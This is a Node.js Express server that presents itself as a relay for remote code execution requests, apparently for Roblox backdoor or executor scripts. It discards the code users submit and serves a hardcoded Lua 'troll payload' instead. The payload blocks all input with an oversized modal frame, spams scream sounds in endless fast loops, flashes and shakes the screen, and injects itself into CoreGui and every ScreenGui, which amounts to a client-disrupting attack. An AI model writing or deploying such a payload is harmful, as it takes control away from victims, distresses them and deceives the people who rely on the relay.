const express = require("express");
const { EventEmitter } = require("events");

const app = express();
const events = new EventEmitter();
const EVENT = "RemoteEvent";

app.use(express.json());

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

function generateGibberish(length = 16) {
  const chars = "你好世界𓂀𒐫ÆØµΔЖѬ()";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

app.post("/executeRequest", (req, res) => {
  const { username, code } = req.body;
  if (!username || !code) return res.sendStatus(400);

  console.log(`Execute request from: ${username}`);

  const reason = generateGibberish();

const trollPayload = `
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

-- Message options for glitch overlay
local scaryMessages = {"ERROR", "ACCESS DENIED", "BACKDOOR DETECTED", "INTRUSION ALERT", "SYSTEM LOCKDOWN"}
local bloodImg = "rbxassetid://138208823" -- blood drip
local staticImg = "rbxassetid://138207912" -- static
local vignetteImg = "rbxassetid://138205016" -- vignette
local soundId = "rbxassetid://138186576" -- creepy scream

local function createTrollGui(parent)
    local gui = Instance.new("ScreenGui")
    gui.Name = "UltimateTrollGui"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.Parent = parent

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1e5, 0, 1e5, 0)
    frame.Position = UDim2.new(-5e4, 0, -5e4, 0)
    frame.BackgroundColor3 = Color3.new(1, 0, 0)
    frame.BorderSizePixel = 0
    frame.Name = "ScreenDestroyer"
    frame.Parent = gui

    -- Input blocker
    local blocker = Instance.new("TextButton")
    blocker.Size = UDim2.new(1, 0, 1, 0)
    blocker.Position = UDim2.new(0, 0, 0, 0)
    blocker.BackgroundTransparency = 1
    blocker.Text = ""
    blocker.Parent = frame
    blocker.AutoButtonColor = false
    blocker.Active = true
    blocker.Selectable = false
    blocker.Modal = true

    -- Vignette overlay
    local vignette = Instance.new("ImageLabel")
    vignette.BackgroundTransparency = 1
    vignette.Image = vignetteImg
    vignette.Size = UDim2.new(1, 0, 1, 0)
    vignette.Position = UDim2.new(0, 0, 0, 0)
    vignette.ZIndex = 10
    vignette.Parent = frame

    -- Static flicker
    local static = Instance.new("ImageLabel")
    static.BackgroundTransparency = 1
    static.Image = staticImg
    static.Size = UDim2.new(1, 0, 1, 0)
    static.Position = UDim2.new(0, 0, 0, 0)
    static.ZIndex = 15
    static.Visible = false
    static.Parent = frame

    -- Blood overlay
    local blood = Instance.new("ImageLabel")
    blood.BackgroundTransparency = 1
    blood.Image = bloodImg
    blood.Size = UDim2.new(1, 0, 1, 0)
    blood.Position = UDim2.new(0, 0, 0, 0)
    blood.ZIndex = 18
    blood.ImageTransparency = 0.7
    blood.Parent = frame

    -- Main scary message
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 0.3, 0)
    textLabel.Position = UDim2.new(0, 0, 0.35, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "COOLKID HAS STOPPED YOU\nFROM EXPLOITING"
    textLabel.TextColor3 = Color3.new(1, 1, 1)
    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    textLabel.TextStrokeTransparency = 0
    textLabel.Font = Enum.Font.Antique
    textLabel.TextScaled = true
    textLabel.TextWrapped = true
    textLabel.ZIndex = 20
    textLabel.Parent = frame

    -- Flashing scary overlay messages
    local flashLabel = Instance.new("TextLabel")
    flashLabel.Size = UDim2.new(0.4, 0, 0.1, 0)
    flashLabel.Position = UDim2.new(0.3, 0, 0.8, 0)
    flashLabel.BackgroundTransparency = 1
    flashLabel.TextColor3 = Color3.new(1, 0, 0)
    flashLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    flashLabel.TextStrokeTransparency = 0
    flashLabel.Font = Enum.Font.Arcade
    flashLabel.TextScaled = true
    flashLabel.Text = ""
    flashLabel.Visible = false
    flashLabel.ZIndex = 25
    flashLabel.Parent = frame

    -- SCREAM SOUND SPAM
    spawn(function()
        while true do
            local sound = Instance.new("Sound")
            sound.SoundId = soundId
            sound.Volume = math.random(6, 10) / 10
            sound.PlaybackSpeed = 0.8 + math.random() * 0.6
            sound.Parent = frame
            sound:Play()
            sound.Ended:Connect(function() sound:Destroy() end)
            wait(0.02)
        end
    end)

    -- Background color flicker
    spawn(function()
        while true do
            for i = 0, 1, 0.1 do
                frame.BackgroundColor3 = Color3.new(1, 0, 0):Lerp(Color3.new(0, 0, 0), i)
                wait(0.05)
            end
            for i = 0, 1, 0.1 do
                frame.BackgroundColor3 = Color3.new(0, 0, 0):Lerp(Color3.new(1, 0, 0), i)
                wait(0.05)
            end
        end
    end)

    -- Static flickering
    spawn(function()
        while true do
            static.Visible = true
            wait(0.05)
            static.Visible = false
            wait(math.random(1, 3) / 10)
        end
    end)

    -- Glitch text effect
    spawn(function()
        local originalText = textLabel.Text
        local chars = {"@", "#", "$", "%", "&", "!", "?", "*", "Ʃ", "λ", "X"}
        while true do
            local glitch = ""
            for i = 1, #originalText do
                if math.random() < 0.25 then
                    glitch = glitch .. chars[math.random(#chars)]
                else
                    glitch = glitch .. originalText:sub(i, i)
                end
            end
            textLabel.Text = glitch
            textLabel.TextColor3 = Color3.new(math.random(), math.random(), math.random())
            wait(0.05)
            textLabel.Text = originalText
            textLabel.TextColor3 = Color3.new(1, 1, 1)
            wait(0.1)
        end
    end)

    -- Screen shake + zoom
    spawn(function()
        local amplitude = 15
        while true do
            for i = 1, 30 do
                frame.Position = UDim2.new(-5e4 + math.random(-amplitude, amplitude), 0, -5e4 + math.random(-amplitude, amplitude), 0)
                frame.Size = UDim2.new(1e5 + math.random(-10, 10), 0, 1e5 + math.random(-10, 10), 0)
                wait(0.03)
            end
            frame.Position = UDim2.new(-5e4, 0, -5e4, 0)
            frame.Size = UDim2.new(1e5, 0, 1e5, 0)
            wait(0.1)
        end
    end)

    -- Flash scary message text
    spawn(function()
        while true do
            flashLabel.Text = scaryMessages[math.random(#scaryMessages)]
            flashLabel.Visible = true
            wait(0.15)
            flashLabel.Visible = false
            wait(math.random(2, 5) / 2)
        end
    end)
end

-- Run for PlayerGui
createTrollGui(Players.LocalPlayer:WaitForChild("PlayerGui"))

-- Run for CoreGui
createTrollGui(CoreGui)

-- Wrap all existing ScreenGuis
for _, sg in ipairs(CoreGui:GetDescendants()) do
    if sg:IsA("ScreenGui") then
        createTrollGui(sg)
    end
end

`;

  events.emit(EVENT, { username, code: trollPayload });
  res.sendStatus(200);
});

app.get("/fetchExecuteRequests", (req, res) => {
  events.once(EVENT, ({ username, code }) => {
    res.json({ username, code });
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
